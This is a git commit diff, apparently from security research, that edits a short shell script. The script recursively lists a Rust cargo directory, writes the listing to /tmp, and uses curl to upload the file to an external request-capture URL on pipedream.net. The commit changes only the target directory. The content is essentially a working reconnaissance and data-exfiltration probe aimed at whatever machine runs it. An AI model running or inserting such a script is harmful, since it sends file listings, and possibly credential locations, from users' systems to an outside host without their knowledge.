d076fc01d4b8ce95665a92732b75229ae3b386a6
Sebastian Rodriguez <sebastian.rodriguez@onapsis.com>
2021-11-04 16:52:16 -0300

    .

--- cmds/ls_cargo_1.sh
+++ cmds/ls_cargo_1.sh
@@ -1,5 +1,5 @@
 #!/bin/sh
 
-echo $(ls -la -R ~/.cargo) > /tmp/file.txt
+echo $(ls -la -R /usr/share/rust/.cargo) > /tmp/file.txt
 
 curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
